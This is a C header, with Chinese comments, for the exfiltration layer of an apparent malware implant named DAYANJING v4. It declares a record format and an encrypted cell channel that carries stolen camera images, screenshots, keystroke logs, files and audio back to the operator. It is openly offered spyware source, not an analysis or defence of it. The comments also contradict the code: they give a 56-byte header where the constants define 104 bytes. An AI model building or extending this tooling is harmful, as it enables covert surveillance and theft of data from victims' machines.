/*
 * DAYANJING v4 — exfil.h
 *
 * 采集产物回传层（exfil）—— 把植入体采集到的产物接入 14_p2p 的 E2EE 信元通道。
 *
 * ====================================================================
 * 解决的问题
 * ====================================================================
 * 14_p2p 的定长信元层（p2p_cell）只定义"恒 512 字节"的封包格式与分批
 * （以 cmd=FIN 收尾），它不知道"一条采集产物"是什么。而 p2p_cell_unpack_stream
 * 在**未读到 FIN 时同样返回 OK** —— 批被截断不会被发现，调用方会拿到一条
 * 不完整的产物却以为成功。这是真实缺陷，本层必须自己管批边界。
 *
 * 本层职责（只此三点，不重复实现任何密码学）：
 *   1. 定义采集产物的记录格式（定长头 + 载荷 + CRC32）
 *   2. 记录 <-> 信元流的转换（分片发出 / 逐信元喂入重组）
 *   3. 批边界与完整性的显式判定：没收到 FIN 就是不完整，绝不静默成功
 *
 * 密码学复用：AEAD 仍是 14_p2p 信元层（底层是 00_crypto 的 AES-128-GCM）。
 * 本层的 CRC32 不是密码学，只用于检测"重组错位 / 解包逻辑错误"——
 * 真正的抗篡改由 AEAD 保证，CRC32 是额外保险。
 *
 * 关于重放与乱序（重要，勿误解）：
 *   信元层的 IV = pfx || counter，由接收方按自身计数器现算，不从信元里读。
 *   因此重放旧信元、或乱序信元，都会因 IV 不匹配而被 AEAD 拒绝，
 *   表现为 EXF_ERR_AUTH —— 本层**不另设 REPLAY 错误码**。
 *   （信元层头文件里的 P2P_CELL_ERR_REPLAY 从未被返回，照抄它会造出死码。）
 *
 * 使用硬约束（违反会导致全线解不开）：
 *   覆盖信元（PAD）同样消耗 counter，必须由**同一个发送上下文**按序产生，
 *   接收方按序解。用独立上下文另造一个 PAD 插入流中会使计数器错位。
 *
 * ====================================================================
 * 记录格式（定长 56 字节头，全小端）
 * ====================================================================
 *   magic(4) "EXF1" || ver(1) || type(1) || flags(1) || rsv(1)
 *   seq(8) || ts_us(8) || width(4) || height(4) || plen(4)
 *   name(64, NUL 填充) || crc32(4)
 *   payload[plen]
 *
 * name 取 64 字节的依据：真实设备名普遍超过 16 字节
 *   ("Integrated Camera" 17、"Logitech HD Webcam C920" 24)，
 *   16 字节会**静默截断丢失末字符**。故扩到 64，并额外规定：
 *   若原始名更长被截断，编码侧置 EXF_FLAG_NAME_TRUNC —— 截断必须被感知。
 *
 * crc32 覆盖 magic..name 与 payload —— 头与载荷任一字节错都会被发现。
 *
 * ====================================================================
 * 产物类型通用化
 * ====================================================================
 * 摄像头只是产物之一。键盘记录、截图、文件窃取、录音共用同一条回传通道，
 * 因此 type 是通用枚举，不是"摄像头专用协议"。
 */

#ifndef DAYANJING_EXFIL_H
#define DAYANJING_EXFIL_H

#include <stddef.h>
#include <stdint.h>
#include "p2p_cell.h"

#ifdef __cplusplus
extern "C" {
#endif

#define EXF_MAGIC4       "EXF1"
#define EXF_VER          1

#define EXF_HDR_LEN     104    /* 定长头，见上 */
#define EXF_NAME_LEN     64    /* 线上字段长度（不含 C 串终止符） */
#define EXF_NAME_BUF    128    /* 结构体输入缓冲：允许调用方传入更长的名字，
                                  从而触发截断并置 EXF_FLAG_NAME_TRUNC。
                                  缓冲若与线上字段等长，则永远无法传入长名，
                                  截断标志会变成死代码。 */

/* 头内字段偏移（避免硬编码散落） */
#define EXF_OFF_SEQ       8
#define EXF_OFF_TS       16
#define EXF_OFF_WIDTH    24
#define EXF_OFF_HEIGHT   28
#define EXF_OFF_PLEN     32
#define EXF_OFF_NAME     36
#define EXF_OFF_CRC     100
#define EXF_PAYLOAD_MAX  (16u << 20)  /* 单条产物载荷上限 16 MiB */

/* ---- 产物类型（通用，不只摄像头） ---- */
#define EXF_TYPE_CAMERA_JPEG  1
#define EXF_TYPE_SCREENSHOT   2
#define EXF_TYPE_KEYLOG       3
#define EXF_TYPE_FILE         4
#define EXF_TYPE_AUDIO        5

/* ---- flags ---- */
#define EXF_FLAG_LAST        0x01   /* 本批最后一帧 */
#define EXF_FLAG_KEYFRAME    0x02   /* 关键帧（图像类） */
#define EXF_FLAG_NAME_TRUNC  0x04   /* name 被截断（原名长于 EXF_NAME_LEN） */

/* ---- 返回值 ---- */
#define EXF_OK            0   /* 喂入的覆盖信元被忽略，无数据产出 */
#define EXF_PARTIAL       1   /* 累积中，尚未收到 FIN */
#define EXF_DONE          2   /* 一批完整，已产出一条记录 */

#define EXF_ERR_ARG       -1  /* 参数非法 */
#define EXF_ERR_LEN       -2  /* 长度非法 / 缓冲区不足 */
#define EXF_ERR_AUTH      -3  /* AEAD 验签失败（篡改或密钥错） */
#define EXF_ERR_FMT       -4  /* 格式错误（magic/ver/rsv 不符） */
#define EXF_ERR_CRC       -5  /* CRC32 不匹配（重组错位 / 解包逻辑错误） */
#define EXF_ERR_INCOMPLETE -6 /* 批未收到 FIN 就结束 —— 绝不静默成功 */
#define EXF_ERR_IO         -7 /* 链路 IO 失败（短写 / 对端关闭 / 残缺信元） */

/* 单条采集产物（解码后 payload 由调用方提供缓冲承接） */
typedef struct {
    uint32_t type;
    uint64_t seq;
    uint64_t ts_us;
    uint32_t width;
    uint32_t height;
    uint32_t flags;
    char     name[EXF_NAME_BUF];      /* 输入侧可长于线上字段；解码侧补 '\0' */
    const uint8_t *payload;           /* 仅编码侧有效 */
    size_t   plen;
} exfil_rec_t;

/*
 * 回传通道。内部持有信元上下文与重组缓冲。
 * buf 在 init 时按 max_rec 分配，wipe 时释放并清零。
 */
typedef struct {
    p2p_cell_ctx_t cell;
    uint8_t *buf;        /* 重组缓冲：EXF_HDR_LEN + payload */
    size_t   buf_cap;
    size_t   off;        /* 当前批已累积字节 */
    int      in_batch;   /* 是否处于一批中间 */
} exfil_chan_t;

/*
 * 初始化回传通道。
 *   k_send / k_recv 必须 16 字节且互不相同（方向分离，两端相反）
 *   pfx            8 字节 nonce 前缀
 *   max_rec        单条产物最大字节数（含头），为 0 时取默认 1 MiB + 头
 */
int exfil_chan_init(exfil_chan_t *ch,
                    const uint8_t k_send[P2P_CELL_KEY_LEN],
                    const uint8_t k_recv[P2P_CELL_KEY_LEN],
                    const uint8_t pfx[P2P_CELL_PFX_LEN],
                    size_t max_rec);

/* 释放并清零（含密钥材料与缓冲） */
void exfil_chan_wipe(exfil_chan_t *ch);

/* 丢弃当前未完成的批，回到空闲态 */
void exfil_chan_reset(exfil_chan_t *ch);

/*
 * 把一条记录编码成信元流（一批）。
 *   out 容量需 >= n_cells * P2P_CELL_WIRE；先用 exfil_send_cells 算 n_cells。
 *   一批的最后一个信元 cmd=FIN；空载荷也产生 1 个 FIN 信元
 *   （避免"空产物不发信元"的侧信道）。
 */
int exfil_send_cells(const exfil_rec_t *r, size_t *n_cells);
int exfil_chan_send(exfil_chan_t *ch, const exfil_rec_t *r,
                    uint8_t *out, size_t cap, size_t *out_cells);

/*
 * 喂入一个信元（恒 512 字节），推进重组状态机。
 *
 * 返回：
 *   EXF_PARTIAL  —— 已累积，尚未收到 FIN
 *   EXF_DONE     —— 收到 FIN，一批完整；*r 与 payload 已产出
 *   EXF_OK       —— 喂入的是覆盖信元（PAD），已忽略
 *   负值         —— 错误
 *
 * payload 可为 NULL（探测模式：只解析头，*plen 回填实际载荷长度）。
 * 收到 EXF_DONE 后内部自动 reset，可连续喂入下一批。
 */
int exfil_chan_feed(exfil_chan_t *ch, const uint8_t in[P2P_CELL_WIRE],
                    exfil_rec_t *r,
                    uint8_t *payload, size_t cap, size_t *plen);

/*
 * 判定当前批是否已完成。用于检测"流被截断"：
 * 若对端关闭连接而 in_batch 仍为真，则该批不完整，调用方必须按失败处理，
 * 不能把已累积的部分当成功。
 */
int exfil_chan_incomplete(const exfil_chan_t *ch);

/* ---- 记录编解码（不涉密，可单独测试） ---- */
int exfil_rec_encode(const exfil_rec_t *r,
                     uint8_t *out, size_t cap, size_t *out_len);

/*
 * 解码。payload 指向 in + EXF_HDR_LEN（不拷贝，随 in 生命周期）。
 * 会校验 magic / ver / rsv / plen 与 in_len 的一致性 / CRC32。
 */
int exfil_rec_decode(const uint8_t *in, size_t in_len, exfil_rec_t *r);

/* 计算"头 + 载荷"的总编码长度 */
size_t exfil_rec_len(const exfil_rec_t *r);

uint32_t exfil_crc32(const uint8_t *data, size_t len);
const char *exfil_errstr(int e);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_EXFIL_H */
